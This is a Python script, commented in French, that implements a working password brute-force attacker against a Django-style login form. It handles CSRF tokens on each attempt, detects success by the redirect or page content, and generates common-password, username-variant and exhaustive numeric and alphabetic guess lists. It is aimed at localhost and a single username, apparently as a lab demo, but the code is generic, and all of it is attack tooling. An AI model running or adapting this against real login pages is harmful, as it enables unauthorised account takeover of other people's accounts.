import requests
import itertools
import time
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

class BruteForceAttacker:
    def __init__(self, target_url, username, max_workers=5, delay=0.1):
        self.target_url = target_url
        self.username = username
        self.session = requests.Session()
        self.max_workers = max_workers
        self.delay = delay
        self.found_password = None
        
    def get_csrf_token(self):
        """Récupère le token CSRF depuis la page de login"""
        try:
            response = self.session.get(f"{self.target_url}/login/")
            if response.status_code == 200:
                # Chercher le token CSRF dans le HTML
                csrf_match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\'](.+?)["\']', response.text)
                if csrf_match:
                    return csrf_match.group(1)
                
                # Alternative : chercher dans les cookies
                csrf_token = self.session.cookies.get('csrftoken')
                if csrf_token:
                    return csrf_token
                    
            print("Impossible de récupérer le token CSRF")
            return None
        except requests.RequestException as e:
            print(f"Erreur lors de la récupération du token CSRF: {e}")
            return None
        
    def test_password(self, password):
        """Teste un mot de passe donné avec gestion CSRF"""
        # Récupérer un nouveau token CSRF pour chaque tentative
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False, password
            
        data = {
            'username': self.username,
            'password': password,
            'csrfmiddlewaretoken': csrf_token
        }
        
        headers = {
            'Referer': f"{self.target_url}/login/",
            'X-CSRFToken': csrf_token
        }
        
        try:
            response = self.session.post(
                f"{self.target_url}/login/",
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=10
            )
            
            # Si la réponse est une redirection (302), la connexion a probablement réussi
            if response.status_code == 302:
                return True, password
            
            # Vérifier aussi si "Nom d'utilisateur ou mot de passe incorrect" n'apparaît pas
            elif response.status_code == 200 and "incorrect" not in response.text.lower():
                # Vérifier d'autres indicateurs de succès
                if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                    return True, password
                    
            return False, password
            
        except requests.RequestException as e:
            print(f"Erreur réseau pour le mot de passe '{password}': {e}")
            return False, password
    
    def generate_common_passwords(self):
        """Génère une liste de mots de passe courants"""
        common_passwords = [
            "123456", "password", "123456789", "12345678", "12345",
            "1234567", "1234567890", "qwerty", "abc123", "111111",
            "123123", "admin", "letmein", "welcome", "monkey",
            "password123", "admin123", "root", "user", "test",
            "guest", "login", "pass", "secret", "changeme",
            f"{self.username}", f"{self.username}123", f"{self.username}1",
            "john123", "user1", "password123", "alice", "alice123"
        ]
        return common_passwords
    
    def generate_numeric_passwords(self, length_range=(4, 8)):
        """Génère des mots de passe numériques"""
        passwords = []
        for length in range(length_range[0], length_range[1] + 1):
            for password in itertools.product('0123456789', repeat=length):
                passwords.append(''.join(password))
                if len(passwords) >= 10000:  # Limite pour éviter trop de combinaisons
                    return passwords
        return passwords
    
    def generate_alphabetic_passwords(self, length_range=(3, 6)):
        """Génère des mots de passe alphabétiques simples"""
        passwords = []
        chars = string.ascii_lowercase
        for length in range(length_range[0], length_range[1] + 1):
            for password in itertools.product(chars, repeat=length):
                passwords.append(''.join(password))
                if len(passwords) >= 5000:  # Limite pour éviter trop de combinaisons
                    return passwords
        return passwords
    
    def run_attack(self, password_list):
        """Lance l'attaque par force brute"""
        print(f"Début de l'attaque par force brute sur {self.username}")
        print(f"Cible: {self.target_url}")
        print(f"Nombre de mots de passe à tester: {len(password_list)}")
        print("-" * 50)
        
        tested_count = 0
        start_time = time.time()
        
        # Test séquentiel pour éviter les problèmes de CSRF avec les threads
        for password in password_list:
            if self.found_password:
                break
                
            success, tested_password = self.test_password(password)
            tested_count += 1
            
            if success:
                self.found_password = tested_password
                elapsed_time = time.time() - start_time
                print(f"\n🎉 MOT DE PASSE TROUVÉ!")
                print(f"Username: {self.username}")
                print(f"Password: {tested_password}")
                print(f"Temps écoulé: {elapsed_time:.2f} secondes")
                print(f"Tentatives: {tested_count}")
                break
            else:
                if tested_count % 10 == 0:
                    elapsed_time = time.time() - start_time
                    rate = tested_count / elapsed_time if elapsed_time > 0 else 0
                    print(f"Testé: {tested_count}/{len(password_list)} - "
                          f"Taux: {rate:.1f} tentatives/sec - "
                          f"Dernier testé: {password}")
            
            # Délai pour éviter de surcharger le serveur
            time.sleep(self.delay)
        
        if not self.found_password:
            elapsed_time = time.time() - start_time
            print(f"\n❌ Mot de passe non trouvé après {tested_count} tentatives en {elapsed_time:.2f} secondes")
        
        return self.found_password

def main():
    # Configuration
    TARGET_URL = "http://127.0.0.1:8000"  # Retiré le slash final
    
    # Liste des utilisateurs à tester
    usernames = ["maphie"]
    
    for username in usernames:
        print(f"\n=== Test de l'utilisateur: {username} ===")
        attacker = BruteForceAttacker(TARGET_URL, username, max_workers=1, delay=0.1)
        
        # 1. Test avec des mots de passe courants
        print("\nPhase 1: Test des mots de passe courants...")
        common_passwords = attacker.generate_common_passwords()
        found = attacker.run_attack(common_passwords)
        
        if found:
            print(f"✅ Succès avec le mot de passe courant: {found}")
            continue
        
        # 2. Test avec des mots de passe numériques courts
        print("\nPhase 2: Test des mots de passe numériques...")
        numeric_passwords = attacker.generate_numeric_passwords((4, 6))
        found = attacker.run_attack(numeric_passwords[:100])  # Limiter pour la démo
        
        if found:
            print(f"✅ Succès avec le mot de passe numérique: {found}")
            continue
            
        print(f"❌ Aucun mot de passe trouvé pour {username}")

if __name__ == "__main__":
    main()